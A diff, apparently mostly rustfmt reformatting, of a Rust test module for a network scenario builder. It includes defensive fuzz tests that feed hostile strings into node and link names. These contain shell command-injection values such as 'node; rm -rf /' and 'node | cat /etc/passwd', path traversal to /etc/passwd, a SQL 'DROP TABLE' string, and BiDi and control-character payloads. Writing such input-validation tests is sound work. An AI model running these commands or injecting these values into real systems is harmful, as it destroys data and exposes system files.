         assert!(result.is_ok());
@@ -3636,9 +4273,11 @@ mod tests {
     #[test]
     fn negative_node_label_with_null_bytes_handled_correctly() {
         let label_with_nulls = "Node\x00\x01Label\x7f";
-        let result = ScenarioBuilder::new("null-label")
-            .seed(42)
-            .add_node("null-node", label_with_nulls, NodeRole::Coordinator);
+        let result = ScenarioBuilder::new("null-label").seed(42).add_node(
+            "null-node",
+            label_with_nulls,
+            NodeRole::Coordinator,
+        );
 
         if let Ok(mut builder) = result {
             let scenario = builder.build().unwrap();
@@ -3654,7 +4293,8 @@ mod tests {
         let result = ScenarioBuilder::new("massive-desc")
             .description(&massive_description)
             .seed(42)
-            .add_node("n1", "Node One", NodeRole::Coordinator).unwrap()
+            .add_node("n1", "Node One", NodeRole::Coordinator)
+            .unwrap()
             .build();
 
         if let Ok(scenario) = result {
@@ -3712,9 +4352,7 @@ mod tests {
 
     #[test]
     fn negative_link_with_empty_id_string_rejected() {
-        let result = two_node_builder()
-            .unwrap()
-            .add_link("", "n1", "n2", true);
+        let result = two_node_builder().unwrap().add_link("", "n1", "n2", true);
 
         assert!(result.is_err());
         match result.unwrap_err() {
@@ -3726,22 +4364,28 @@ mod tests {
     #[test]
     fn negative_fault_profile_with_negative_probability_values_handled() {
         let invalid_fault_config = LinkFaultConfig {
-            packet_loss_rate: -0.5,    // Negative probability
+            packet_loss_rate: -0.5, // Negative probability
             latency_ms_base: 100,
             latency_ms_jitter: 50,
             bandwidth_limit_kbps: Some(1000),
-            corruption_rate: -1.0,     // Negative corruption rate
+            corruption_rate: -1.0, // Negative corruption rate
         };
 
         let mut builder = two_node_builder().unwrap();
-        let _ = builder.add_link("negative-fault", "n1", "n2", true).unwrap();
+        let _ = builder
+            .add_link("negative-fault", "n1", "n2", true)
+            .unwrap();
 
         let result = builder.set_fault_profile("negative-fault", invalid_fault_config);
 
         if result.is_ok() {
             // If accepted, should clamp or handle negative values
             let scenario = builder.build().unwrap();
-            let link = scenario.links.iter().find(|l| l.id == "negative-fault").unwrap();
+            let link = scenario
+                .links
+                .iter()
+                .find(|l| l.id == "negative-fault")
+                .unwrap();
             if let Some(ref config) = link.fault_config {
                 // Negative values should be handled somehow (clamped to 0 or preserved)
                 assert!(config.packet_loss_rate >= -0.5); // Either preserved or clamped
@@ -3757,15 +4401,27 @@ mod tests {
 
         // Create a scenario with many nodes and links
         for i in 0..MAX_NODES {
-            builder = builder.add_node(format!("node-{i}"), format!("Very Long Node Label {}", "x".repeat(1000)), NodeRole::Participant).unwrap();
+            builder = builder
+                .add_node(
+                    format!("node-{i}"),
+                    format!("Very Long Node Label {}", "x".repeat(1000)),
+                    NodeRole::Participant,
+                )
+                .unwrap();
         }
 
         // Add links between all pairs (if within limits)
         let mut link_count = 0;
-        for i in 0..MAX_NODES.min(10) { // Limit to avoid too many links
-            for j in (i+1)..MAX_NODES.min(10) {
+        for i in 0..MAX_NODES.min(10) {
+            // Limit to avoid too many links
+            for j in (i + 1)..MAX_NODES.min(10) {
                 if link_count < MAX_LINKS {
-                    let _ = builder.add_link(format!("link-{i}-{j}"), format!("node-{i}"), format!("node-{j}"), true);
+                    let _ = builder.add_link(
+                        format!("link-{i}-{j}"),
+                        format!("node-{i}"),
+                        format!("node-{j}"),
+                        true,
+                    );
                     link_count += 1;
                 }
             }
@@ -3775,14 +4431,20 @@ mod tests {
 
         // Should be able to serialize large scenarios without panicking
         let json_result = scenario.to_json();
-        assert!(json_result.is_ok(), "Large scenario JSON serialization should not panic");
+        assert!(
+            json_result.is_ok(),
+            "Large scenario JSON serialization should not panic"
+        );
 
         let json = json_result.unwrap();
         assert!(json.len() > 10_000); // Should be a substantial JSON
 
         // Should be able to deserialize back
         let parsed_result = Scenario::from_json(&json);
-        assert!(parsed_result.is_ok(), "Large scenario JSON deserialization should not panic");
+        assert!(
+            parsed_result.is_ok(),
+            "Large scenario JSON deserialization should not panic"
+        );
     }
 
     #[test]
@@ -3800,8 +4462,12 @@ mod tests {
 
         assert!(result.is_ok());
         let scenario = result.unwrap();
-        assert!(scenario.assertions.iter().any(|a| matches!(a,
-            ScenarioAssertion::MessageDelivered { within_ticks: u64::MAX, .. }
+        assert!(scenario.assertions.iter().any(|a| matches!(
+            a,
+            ScenarioAssertion::MessageDelivered {
+                within_ticks: u64::MAX,
+                ..
+            }
         )));
     }
 
@@ -3831,11 +4497,11 @@ mod tests {
     fn test_unicode_injection_in_node_names() {
         // Test various Unicode injection attacks in node names
         let unicode_nodes = vec![
-            "normal\u{200b}\u{feff}hidden",  // Zero-width characters
-            "reverse\u{202e}trap\u{202c}normal",  // BiDi override
-            "new\nline",  // Newline injection
-            "tab\there",  // Tab injection
-            "\u{0000}null",  // Null byte injection
+            "normal\u{200b}\u{feff}hidden",      // Zero-width characters
+            "reverse\u{202e}trap\u{202c}normal", // BiDi override
+            "new\nline",                         // Newline injection
+            "tab\there",                         // Tab injection
+            "\u{0000}null",                      // Null byte injection
         ];
 
         let mut builder = ScenarioBuilder::new("unicode-test", 123);
@@ -3871,7 +4537,7 @@ mod tests {
 
         // Add links with massive fault profiles
         for i in 0..MAX_NODES {
-            for j in (i+1)..MAX_NODES {
+            for j in (i + 1)..MAX_NODES {
                 let link_id = format!("link-{}-{}", i, j);
                 let from = format!("node-{:04}", i);
                 let to = format!("node-{:04}", j);
@@ -3930,7 +4596,7 @@ mod tests {
             u64::MAX,
             u64::MAX - 1,
             u64::MAX / 2,
-            (1u64 << 63) - 1,  // Just below signed overflow
+            (1u64 << 63) - 1, // Just below signed overflow
         ];
 
         for (i, time) in overflow_times.iter().enumerate() {
@@ -3938,7 +4604,7 @@ mod tests {
                 &format!("msg-{}", i),
                 "sender",
                 "receiver",
-                *time
+                *time,
             );
         }
 
@@ -3958,18 +4624,18 @@ mod tests {
     fn test_link_endpoint_corruption_resistance() {
         // Test links with corrupted/invalid endpoints
         let invalid_endpoints = vec![
-            ("", "node2"),  // Empty source
-            ("node1", ""),  // Empty destination
-            ("nonexistent", "node2"),  // Non-existent source
-            ("node1", "nonexistent"),  // Non-existent destination
-            ("self", "self"),  // Self-loop (if added as node)
-            ("../../../etc/passwd", "node2"),  // Path traversal attempt
+            ("", "node2"),                    // Empty source
+            ("node1", ""),                    // Empty destination
+            ("nonexistent", "node2"),         // Non-existent source
+            ("node1", "nonexistent"),         // Non-existent destination
+            ("self", "self"),                 // Self-loop (if added as node)
+            ("../../../etc/passwd", "node2"), // Path traversal attempt
         ];
 
         let mut builder = ScenarioBuilder::new("endpoint-test", 111)
             .add_node("node1")
             .add_node("node2")
-            .add_node("self");  // Add self for self-loop test
+            .add_node("self"); // Add self for self-loop test
 
         for (i, (from, to)) in invalid_endpoints.iter().enumerate() {
             let link_id = format!("bad-link-{}", i);
@@ -4011,11 +4677,11 @@ mod tests {
     fn test_duplicate_detection_edge_cases() {
         // Test various forms of "duplicate" names that should be caught
         let near_duplicates = vec![
-            ("node", "node"),  // Exact duplicate
-            ("NODE", "node"),  // Case difference (should be allowed)
-            ("node\u{0000}", "node"),  // Null byte difference
-            ("node\u{200b}", "node"),  // Zero-width difference
-            ("  node  ", "node"),  // Whitespace difference (should be allowed)
+            ("node", "node"),         // Exact duplicate
+            ("NODE", "node"),         // Case difference (should be allowed)
+            ("node\u{0000}", "node"), // Null byte difference
+            ("node\u{200b}", "node"), // Zero-width difference
+            ("  node  ", "node"),     // Whitespace difference (should be allowed)
         ];
 
         for (name1, name2) in near_duplicates {
@@ -4070,32 +4736,32 @@ mod tests {
         use std::sync::{Arc, Barrier, Mutex};
         use std::thread;
 
-        let shared_builder = Arc::new(Mutex::new(
-            ScenarioBuilder::new("concurrent-test", 333)
-        ));
+        let shared_builder = Arc::new(Mutex::new(ScenarioBuilder::new("concurrent-test", 333)));
         let barrier = Arc::new(Barrier::new(4));
 
-        let handles: Vec<_> = (0..4).map(|i| {
-            let builder = Arc::clone(&shared_builder);
-            let barrier = Arc::clone(&barrier);
+        let handles: Vec<_> = (0..4)
+            .map(|i| {
+                let builder = Arc::clone(&shared_builder);
+                let barrier = Arc::clone(&barrier);
 
-            thread::spawn(move || {
-                barrier.wait();
+                thread::spawn(move || {
+                    barrier.wait();
 
-                // Each thread tries to add different nodes
-                let node_name = format!("thread-{}-node", i);
-                let mut builder = builder.lock().unwrap();
-                *builder = builder.clone().add_node(&node_name);
+                    // Each thread tries to add different nodes
+                    let node_name = format!("thread-{}-node", i);
+                    let mut builder = builder.lock().unwrap();
+                    *builder = builder.clone().add_node(&node_name);
 
-                if i == 0 {
-                    // Only thread 0 adds second node and builds
-                    *builder = builder.clone().add_node("shared-node");
-                    builder.clone().build()
-                } else {
-                    Ok(Scenario::default())  // Dummy return for other threads
-                }
+                    if i == 0 {
+                        // Only thread 0 adds second node and builds
+                        *builder = builder.clone().add_node("shared-node");
+                        builder.clone().build()
+                    } else {
+                        Ok(Scenario::default()) // Dummy return for other threads
+                    }
+                })
             })
-        }).collect();
+            .collect();
 
         let results: Vec<_> = handles.into_iter().map(|h| h.join().unwrap()).collect();
 
@@ -4113,7 +4779,10 @@ mod tests {
     #[test]
     fn test_unicode_injection_resistance_comprehensive() {
         // RTL override attack on node identifiers
-        let rtl_node_id = format!("normal{}\u{202e}gnissim{}\u{202c}safe", "\u{202e}", "\u{202c}");
+        let rtl_node_id = format!(
+            "normal{}\u{202e}gnissim{}\u{202c}safe",
+            "\u{202e}", "\u{202c}"
+        );
 
         // Zero-width space pollution in names
         let zws_name = "admin\u{200b}\u{200c}\u{200d}\u{feff}user";
@@ -4133,7 +4802,10 @@ mod tests {
             .unwrap()
             .build();
 
-        assert!(result.is_ok(), "scenario builder should handle Unicode injection gracefully");
+        assert!(
+            result.is_ok(),
+            "scenario builder should handle Unicode injection gracefully"
+        );
 
         let scenario = result.unwrap();
         // Verify Unicode preservation without normalization corruption
@@ -4146,12 +4818,13 @@ mod tests {
         let mut builder = minimal_builder();
 
         // Add maximum allowed nodes with maximum-length identifiers
-        let max_id_len = 10000;  // Stress test large string allocations
+        let max_id_len = 10000; // Stress test large string allocations
         for i in 0..MAX_NODES {
             let huge_id = format!("node_{}_", i) + &"x".repeat(max_id_len);
             let huge_name = format!("Node {} ", i) + &"description_".repeat(1000);
 
-            builder = builder.add_node(huge_id, huge_name, NodeRole::Participant)
+            builder = builder
+                .add_node(huge_id, huge_name, NodeRole::Participant)
                 .expect("should handle large node data");
         }
 
@@ -4165,7 +4838,8 @@ mod tests {
             for (j, target) in node_ids.iter().enumerate() {
                 if i != j && link_count < MAX_LINKS {
                     let link_id = format!("massive_link_{}_{}_", i, j) + &"y".repeat(5000);
-                    builder = builder.add_link(link_id, source, target, true)
+                    builder = builder
+                        .add_link(link_id, source, target, true)
                         .expect("should handle massive link topology");
                     link_count += 1;
                 }
@@ -4173,7 +4847,10 @@ mod tests {
         }
 
         let result = builder.build();
-        assert!(result.is_ok(), "should handle maximum topology without memory exhaustion");
+        assert!(
+            result.is_ok(),
+            "should handle maximum topology without memory exhaustion"
+        );
     }
 
     #[test]
@@ -4225,14 +4902,23 @@ mod tests {
 
         // Test serialization resistance
         let serialized = serde_json::to_string(&scenario);
-        assert!(serialized.is_ok(), "JSON serialization should escape control chars");
+        assert!(
+            serialized.is_ok(),
+            "JSON serialization should escape control chars"
+        );
 
         let json_str = serialized.unwrap();
-        assert!(!json_str.contains("\"role\": \"Admin\""), "should not parse injected JSON");
+        assert!(
+            !json_str.contains("\"role\": \"Admin\""),
+            "should not parse injected JSON"
+        );
 
         // Test round-trip integrity
         let deserialized: Result<Scenario, _> = serde_json::from_str(&json_str);
-        assert!(deserialized.is_ok(), "should deserialize escaped JSON safely");
+        assert!(
+            deserialized.is_ok(),
+            "should deserialize escaped JSON safely"
+        );
     }
 
     #[test]
@@ -4255,7 +4941,11 @@ mod tests {
         // Add nodes with potential collision IDs
         for (i, id) in collision_candidates.iter().enumerate() {
             let name = format!("Node {}", i);
-            let role = if i % 2 == 0 { NodeRole::Coordinator } else { NodeRole::Participant };
+            let role = if i % 2 == 0 {
+                NodeRole::Coordinator
+            } else {
+                NodeRole::Participant
+            };
             builder = builder.add_node(id, name, role).unwrap();
         }
 
@@ -4269,7 +4959,11 @@ mod tests {
         // Verify node ID uniqueness was maintained
         let mut seen_ids = BTreeSet::new();
         for node in &scenario.nodes {
-            assert!(seen_ids.insert(node.id.clone()), "node ID should be unique: {}", node.id);
+            assert!(
+                seen_ids.insert(node.id.clone()),
+                "node ID should be unique: {}",
+                node.id
+            );
         }
     }
 
@@ -4314,12 +5008,16 @@ mod tests {
 
         for (i, pattern) in traversal_patterns.iter().enumerate() {
             let node_id = format!("node_{}", i);
-            builder = builder.add_node(node_id, pattern, NodeRole::Observer)
+            builder = builder
+                .add_node(node_id, pattern, NodeRole::Observer)
                 .expect("should accept path-like names without traversal");
         }
 
         let result = builder.build();
-        assert!(result.is_ok(), "path traversal patterns should be treated as literal names");
+        assert!(
+            result.is_ok(),
+            "path traversal patterns should be treated as literal names"
+        );
 
         let scenario = result.unwrap();
         assert_eq!(scenario.nodes.len(), traversal_patterns.len());
@@ -4329,8 +5027,8 @@ mod tests {
     fn test_btreemap_ordering_manipulation() {
         // Create node IDs that might disrupt BTreeMap ordering
         let ordering_attack_ids = vec![
-            "\u{0000}first",   // Null prefix
-            "\u{ffff}last",    // High Unicode
+            "\u{0000}first", // Null prefix
+            "\u{ffff}last",  // High Unicode
             " leading_space",
             "trailing_space ",
             "\ttab_prefix",
@@ -4369,19 +5067,22 @@ mod tests {
         // Simulate concurrent modifications that might corrupt internal state
         let shared_data = Arc::new(Mutex::new(Vec::<String>::new()));
 
-        let handles: Vec<_> = (0..10).map(|thread_id| {
-            let data = Arc::clone(&shared_data);
+        let handles: Vec<_> = (0..10)
+            .map(|thread_id| {
+                let data = Arc::clone(&shared_data);
 
-            thread::spawn(move || {
-                for i in 0..100 {
-                    let mut guard = data.lock().unwrap();
-                    let malicious_id = format!("thread_{}_item_{}_\u{202e}trojan\u{202c}", thread_id, i);
+                thread::spawn(move || {
+                    for i in 0..100 {
+                        let mut guard = data.lock().unwrap();
+                        let malicious_id =
+                            format!("thread_{}_item_{}_\u{202e}trojan\u{202c}", thread_id, i);
 
-                    // Simulate the push_bounded behavior under concurrent access
-                    push_bounded(&mut *guard, malicious_id, 50);
-                }
+                        // Simulate the push_bounded behavior under concurrent access
+                        push_bounded(&mut *guard, malicious_id, 50);
+                    }
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for all threads
         for handle in handles {
@@ -4390,7 +5091,10 @@ mod tests {
 
         let final_data = shared_data.lock().unwrap();
         // Verify no state corruption occurred
-        assert!(final_data.len() <= 50, "capacity should be respected under concurrency");
+        assert!(
+            final_data.len() <= 50,
+            "capacity should be respected under concurrency"
+        );
 
         // Verify no duplicate entries (would indicate race condition)
         let mut seen = BTreeSet::new();
@@ -4422,11 +5126,14 @@ mod tests {
         match deserialize_result {
             Ok(_) => {
                 // If it succeeds, that's fine - serde handled the depth
-            },
+            }
             Err(e) => {
                 // If it fails, should be a controlled error, not a stack overflow
                 let error_msg = e.to_string();
-                assert!(!error_msg.contains("stack overflow"), "should fail gracefully without stack overflow");
+                assert!(
+                    !error_msg.contains("stack overflow"),
+                    "should fail gracefully without stack overflow"
+                );
             }
         }
     }
@@ -4441,11 +5148,11 @@ mod tests {
 
         // Unicode bidirectional injection attacks on node names
         let bidi_attack_names = [
-            "node\u{202E}dnamed_evil", // Right-to-Left Override
-            "node\u{202D}legitimate\u{202E}malicious", // LTR Override with RTL
-            "test\u{061C}node", // Arabic Letter Mark injection
-            "node\u{200E}normal\u{200F}reversed", // LTR/RTL Mark injection
-            "scenario\u{2066}node\u{2069}isolated", // Isolate injection
+            "node\u{202E}dnamed_evil",                  // Right-to-Left Override
+            "node\u{202D}legitimate\u{202E}malicious",  // LTR Override with RTL
+            "test\u{061C}node",                         // Arabic Letter Mark injection
+            "node\u{200E}normal\u{200F}reversed",       // LTR/RTL Mark injection
+            "scenario\u{2066}node\u{2069}isolated",     // Isolate injection
             "node\u{2067}bidirectional\u{2069}exploit", // RTL Isolate injection
         ];
 
@@ -4467,45 +5174,66 @@ mod tests {
                     let nodes: Vec<&str> = scenario.nodes().keys().map(|s| s.as_str()).collect();
 
                     // Verify node names are properly handled
-                    assert!(nodes.contains(malicious_name),
-                        "Attack {}: Injected node should be present if accepted", attack_idx);
-                    assert!(nodes.contains(&"legitimate_node"),
-                        "Attack {}: Legitimate node should be unaffected", attack_idx);
+                    assert!(
+                        nodes.contains(malicious_name),
+                        "Attack {}: Injected node should be present if accepted",
+                        attack_idx
+                    );
+                    assert!(
+                        nodes.contains(&"legitimate_node"),
+                        "Attack {}: Legitimate node should be unaffected",
+                        attack_idx
+                    );
 
                     // Verify scenario serialization safety
                     let json_result = serde_json::to_string(&scenario);
-                    assert!(json_result.is_ok(),
-                        "Attack {}: Scenario with injection should serialize safely", attack_idx);
+                    assert!(
+                        json_result.is_ok(),
+                        "Attack {}: Scenario with injection should serialize safely",
+                        attack_idx
+                    );
 
                     if let Ok(json) = json_result {
                         // Verify no control characters in JSON
-                        assert!(!json.contains('\u{202E}') || json.contains("\\u202"),
-                            "Attack {}: JSON should escape or handle bidirectional overrides", attack_idx);
-                        assert!(!json.contains('\0'),
-                            "Attack {}: JSON should not contain null bytes", attack_idx);
+                        assert!(
+                            !json.contains('\u{202E}') || json.contains("\\u202"),
+                            "Attack {}: JSON should escape or handle bidirectional overrides",
+                            attack_idx
+                        );
+                        assert!(
+                            !json.contains('\0'),
+                            "Attack {}: JSON should not contain null bytes",
+                            attack_idx
+                        );
                     }
-                },
+                }
                 Err(e) => {
                     // If rejected, verify appropriate error handling
                     let error_msg = e.to_string();
-                    assert!(!error_msg.contains('\u{202E}'),
-                        "Attack {}: Error message should not contain bidirectional override", attack_idx);
-                    assert!(!error_msg.is_empty(),
-                        "Attack {}: Error should provide meaningful message", attack_idx);
+                    assert!(
+                        !error_msg.contains('\u{202E}'),
+                        "Attack {}: Error message should not contain bidirectional override",
+                        attack_idx
+                    );
+                    assert!(
+                        !error_msg.is_empty(),
+                        "Attack {}: Error should provide meaningful message",
+                        attack_idx
+                    );
                 }
             }
         }
 
         // Test control character injection in node names
         let control_char_attacks = [
-            "node\x00null_injection",       // Null byte injection
-            "node\x1B[31mRED\x1B[0m",      // ANSI escape sequence injection
-            "node\r\nCRLF_injection",       // CRLF injection
-            "node\x01\x02\x03control",      // Various control characters
-            "node\x7Fdel_char",             // DEL character injection
-            "node\x08backspace",            // Backspace injection
-            "node\x0Cform_feed",            // Form feed injection
-            "node\x0Bvertical_tab",         // Vertical tab injection
+            "node\x00null_injection",  // Null byte injection
+            "node\x1B[31mRED\x1B[0m",  // ANSI escape sequence injection
+            "node\r\nCRLF_injection",  // CRLF injection
+            "node\x01\x02\x03control", // Various control characters
+            "node\x7Fdel_char",        // DEL character injection
+            "node\x08backspace",       // Backspace injection
+            "node\x0Cform_feed",       // Form feed injection
+            "node\x0Bvertical_tab",    // Vertical tab injection
         ];
 
         for (attack_idx, control_name) in control_char_attacks.iter().enumerate() {
@@ -4521,36 +5249,48 @@ mod tests {
             match build_result {
                 Ok(scenario) => {
                     // Verify scenario remains functional
-                    assert!(scenario.nodes().len() >= 1,
-                        "Control attack {}: Scenario should have at least one node", attack_idx);
+                    assert!(
+                        scenario.nodes().len() >= 1,
+                        "Control attack {}: Scenario should have at least one node",
+                        attack_idx
+                    );
 
                     // Test JSON serialization safety
                     let json_result = serde_json::to_string(&scenario);
-                    assert!(json_result.is_ok(),
-                        "Control attack {}: Should serialize despite control characters", attack_idx);
-                },
+                    assert!(
+                        json_result.is_ok(),
+                        "Control attack {}: Should serialize despite control characters",
+                        attack_idx
+                    );
+                }
                 Err(e) => {
                     // Verify error doesn't leak control characters
                     let error_msg = e.to_string();
-                    assert!(!error_msg.contains('\0'),
-                        "Control attack {}: Error should not contain null bytes", attack_idx);
-                    assert!(!error_msg.contains('\x1B'),
-                        "Control attack {}: Error should not contain ANSI escapes", attack_idx);
+                    assert!(
+                        !error_msg.contains('\0'),
+                        "Control attack {}: Error should not contain null bytes",
+                        attack_idx
+                    );
+                    assert!(
+                        !error_msg.contains('\x1B'),
+                        "Control attack {}: Error should not contain ANSI escapes",
+                        attack_idx
+                    );
                 }
             }
         }
 
         // Test command injection attempts in node names
         let command_injection_attacks = [
-            "node; rm -rf /",              // Shell command injection
-            "node && echo evil",           // Command chaining
-            "node || echo fallback",       // Command alternation
-            "node | cat /etc/passwd",      // Pipe injection
-            "node $(whoami)",              // Command substitution
-            "node `id`",                   // Backtick command substitution
-            "node${IFS}injection",         // Variable injection
-            "../../../etc/passwd",         // Path traversal attempt
-            "node\n/bin/sh",              // Newline command injection
+            "node; rm -rf /",         // Shell command injection
+            "node && echo evil",      // Command chaining
+            "node || echo fallback",  // Command alternation
+            "node | cat /etc/passwd", // Pipe injection
+            "node $(whoami)",         // Command substitution
+            "node `id`",              // Backtick command substitution
+            "node${IFS}injection",    // Variable injection
+            "../../../etc/passwd",    // Path traversal attempt
+            "node\n/bin/sh",          // Newline command injection
         ];
 
         for (attack_idx, injection_name) in command_injection_attacks.iter().enumerate() {
@@ -4566,25 +5306,33 @@ mod tests {
             match build_result {
                 Ok(scenario) => {
                     // Verify no command execution occurred
-                    assert!(scenario.nodes().len() >= 1,
-                        "Injection attack {}: Scenario should remain valid", attack_idx);
+                    assert!(
+                        scenario.nodes().len() >= 1,
+                        "Injection attack {}: Scenario should remain valid",
+                        attack_idx
+                    );
 
                     // Verify node name handling
                     let node_names: Vec<String> = scenario.nodes().keys().cloned().collect();
                     for node_name in &node_names {
                         // Node names should be treated as literal strings, not commands
-                        assert!(!node_name.is_empty(),
-                            "Injection attack {}: Node names should not be empty", attack_idx);
+                        assert!(
+                            !node_name.is_empty(),
+                            "Injection attack {}: Node names should not be empty",
+                            attack_idx
+                        );
                     }
-                },
+                }
                 Err(_) => {
                     // Rejection is acceptable for malformed node names
                 }
             }
         }
 
-        println!("Node name injection test completed: {} attack vectors tested",
-            bidi_attack_names.len() + control_char_attacks.len() + command_injection_attacks.len());
+        println!(
+            "Node name injection test completed: {} attack vectors tested",
+            bidi_attack_names.len() + control_char_attacks.len() + command_injection_attacks.len()
+        );
     }
 
     #[test]
@@ -4625,35 +5373,53 @@ mod tests {
         let build_duration = start_time.elapsed();
 
         // Verify build completes in reasonable time (should not hang)
-        assert!(build_duration < Duration::from_secs(5),
-            "Maximum complexity build should complete in reasonable time: {:?}", build_duration);
+        assert!(
+            build_duration < Duration::from_secs(5),
+            "Maximum complexity build should complete in reasonable time: {:?}",
+            build_duration
+        );
 
         match max_build_result {
             Ok(scenario) => {
                 // Verify scenario properties under maximum complexity
-                assert!(scenario.nodes().len() <= MAX_NODES,
-                    "Scenario should respect maximum node count");
-                assert!(scenario.links().len() <= MAX_LINKS_CAP,
-                    "Scenario should respect maximum link count");
+                assert!(
+                    scenario.nodes().len() <= MAX_NODES,
+                    "Scenario should respect maximum node count"
+                );
+                assert!(
+                    scenario.links().len() <= MAX_LINKS_CAP,
+                    "Scenario should respect maximum link count"
+                );
 
                 // Test serialization performance under complexity
                 let serialize_start = Instant::now();
                 let serialize_result = serde_json::to_string(&scenario);
                 let serialize_duration = serialize_start.elapsed();
 
-                assert!(serialize_duration < Duration::from_secs(2),
-                    "Serialization should complete in reasonable time: {:?}", serialize_duration);
-                assert!(serialize_result.is_ok(),
-                    "Complex scenario should serialize successfully");
+                assert!(
+                    serialize_duration < Duration::from_secs(2),
+                    "Serialization should complete in reasonable time: {:?}",
+                    serialize_duration
+                );
+                assert!(
+                    serialize_result.is_ok(),
+                    "Complex scenario should serialize successfully"
+                );
 
-                println!("Maximum complexity scenario: {} nodes, {} links, build time: {:?}",
-                    scenario.nodes().len(), scenario.links().len(), build_duration);
-            },
+                println!(
+                    "Maximum complexity scenario: {} nodes, {} links, build time: {:?}",
+                    scenario.nodes().len(),
+                    scenario.links().len(),
+                    build_duration
+                );
+            }
             Err(e) => {
                 // Rejection due to complexity limits is acceptable
                 println!("Maximum complexity scenario rejected: {}", e);
-                assert!(e.to_string().contains("TOO_MANY") || e.to_string().contains("limit"),
-                    "Error should indicate complexity limit exceeded");
+                assert!(
+                    e.to_string().contains("TOO_MANY") || e.to_string().contains("limit"),
+                    "Error should indicate complexity limit exceeded"
+                );
             }
         }
 
@@ -4665,11 +5431,14 @@ mod tests {
 
         // Create links with pathological names
         let pathological_names = [
-            "a".repeat(1000),                           // Very long name
-            (0..1000).map(|i| format!("link_{}", i)).collect::<Vec<_>>().join("_"), // Deep nesting simulation
+            "a".repeat(1000), // Very long name
+            (0..1000)
+                .map(|i| format!("link_{}", i))
+                .collect::<Vec<_>>()
+                .join("_"), // Deep nesting simulation
             "link_".to_string() + &"nested_".repeat(100), // Repetitive pattern
             (0..100).map(|_| "complex").collect::<Vec<_>>().join("||"), // Separator flood
-            "link_with_unicode_🚀_".repeat(100),        // Unicode repetition
+            "link_with_unicode_🚀_".repeat(100), // Unicode repetition
         ];
 
         for (name_idx, pathological_name) in pathological_names.iter().enumerate() {
@@ -4684,23 +5453,33 @@ mod tests {
             let pathological_duration = start_time.elapsed();
 
             // Verify pathological names don't cause excessive processing time
-            assert!(pathological_duration < Duration::from_secs(1),
+            assert!(
+                pathological_duration < Duration::from_secs(1),
                 "Pathological name {} should not cause excessive build time: {:?}",
-                name_idx, pathological_duration);
+                name_idx,
+                pathological_duration
+            );
 
             match pathological_result {
                 Ok(scenario) => {
                     // Verify scenario integrity under pathological naming
-                    assert_eq!(scenario.nodes().len(), 2,
-                        "Pathological scenario should have correct node count");
-                    assert!(scenario.links().len() <= 1,
-                        "Pathological scenario should have at most one link");
-                },
+                    assert_eq!(
+                        scenario.nodes().len(),
+                        2,
+                        "Pathological scenario should have correct node count"
+                    );
+                    assert!(
+                        scenario.links().len() <= 1,
+                        "Pathological scenario should have at most one link"
+                    );
+                }
                 Err(e) => {
                     // Rejection due to name limits is acceptable
                     let error_msg = e.to_string();
-                    assert!(!error_msg.is_empty(),
-                        "Error for pathological name should be meaningful");
+                    assert!(
+                        !error_msg.is_empty(),
+                        "Error for pathological name should be meaningful"
+                    );
                 }
             }
         }
@@ -4723,16 +5502,24 @@ mod tests {
         let assertion_result = assertion_builder.build();
         let assertion_duration = assertion_start.elapsed();
 
-        assert!(assertion_duration < Duration::from_secs(3),
-            "Assertion complexity should not cause excessive build time: {:?}", assertion_duration);
+        assert!(
+            assertion_duration < Duration::from_secs(3),
+            "Assertion complexity should not cause excessive build time: {:?}",
+            assertion_duration
+        );
 
         match assertion_result {
             Ok(scenario) => {
-                assert!(scenario.assertions().len() <= MAX_ASSERTIONS,
-                    "Scenario should respect assertion limits");
-                println!("Assertion complexity test: {} assertions processed in {:?}",
-                    scenario.assertions().len(), assertion_duration);
-            },
+                assert!(
+                    scenario.assertions().len() <= MAX_ASSERTIONS,
+                    "Scenario should respect assertion limits"
+                );
+                println!(
+                    "Assertion complexity test: {} assertions processed in {:?}",
+                    scenario.assertions().len(),
+                    assertion_duration
+                );
+            }
             Err(e) => {
                 println!("Assertion complexity rejected: {}", e);
             }
@@ -4760,16 +5547,14 @@ mod tests {
                 bandwidth_kbps: 1000,
                 corruption_rate: 0.01,
             },
-
             // Command injection in fault parameters
             LinkFaultConfig {
                 link_name: "target_link; rm -rf /".to_string(),
                 packet_loss_rate: 0.5,
                 latency_ms: 999999999, // Extreme latency
-                bandwidth_kbps: 0,      // Zero bandwidth (potential DoS)
-                corruption_rate: 1.0,   // 100% corruption
+                bandwidth_kbps: 0,     // Zero bandwidth (potential DoS)
+                corruption_rate: 1.0,  // 100% corruption
             },
-
             // Path traversal in link names
             LinkFaultConfig {
                 link_name: "../../../etc/passwd".to_string(),
@@ -4778,25 +5563,22 @@ mod tests {
                 bandwidth_kbps: 1000000,
                 corruption_rate: 0.0,
             },
-
             // Unicode injection with zero-width characters
             LinkFaultConfig {
                 link_name: "target_link\u{200B}invisible".to_string(),
                 packet_loss_rate: 0.0,
-                latency_ms: 0,          // Zero latency (potential timing issue)
+                latency_ms: 0,             // Zero latency (potential timing issue)
                 bandwidth_kbps: 999999999, // Extreme bandwidth
-                corruption_rate: -0.1,  // Negative corruption rate
+                corruption_rate: -0.1,     // Negative corruption rate
             },
-
             // Control character injection
             LinkFaultConfig {
                 link_name: "target_link\x00null_injection".to_string(),
-                packet_loss_rate: std::f64::NAN, // NaN injection
-                latency_ms: u32::MAX,            // Maximum integer value
-                bandwidth_kbps: u32::MAX,        // Maximum bandwidth
+                packet_loss_rate: std::f64::NAN,     // NaN injection
+                latency_ms: u32::MAX,                // Maximum integer value
+                bandwidth_kbps: u32::MAX,            // Maximum bandwidth
                 corruption_rate: std::f64::INFINITY, // Infinity injection
             },
-
             // Format string injection attempts
             LinkFaultConfig {
                 link_name: "target_link%n%s%x".to_string(),
@@ -4805,7 +5587,6 @@ mod tests {
                 bandwidth_kbps: 1000,
                 corruption_rate: 0.1,
             },
-
             // LDAP/SQL injection patterns
             LinkFaultConfig {
                 link_name: "target_link'; DROP TABLE links; --".to_string(),
@@ -4814,7 +5595,6 @@ mod tests {
                 bandwidth_kbps: 1000,
                 corruption_rate: 0.01,
             },
-
             // Buffer overflow simulation
             LinkFaultConfig {
                 link_name: "A".repeat(10000),
@@ -4826,7 +5606,10 @@ mod tests {
         ];
 
         for (attack_idx, malicious_config) in malicious_fault_configs.iter().enumerate() {
-            println!("Testing fault injection attack {}: {}", attack_idx, malicious_config.link_name);
+            println!(
+                "Testing fault injection attack {}: {}",
+                attack_idx, malicious_config.link_name
+            );
 
             // Create separate builder for each attack
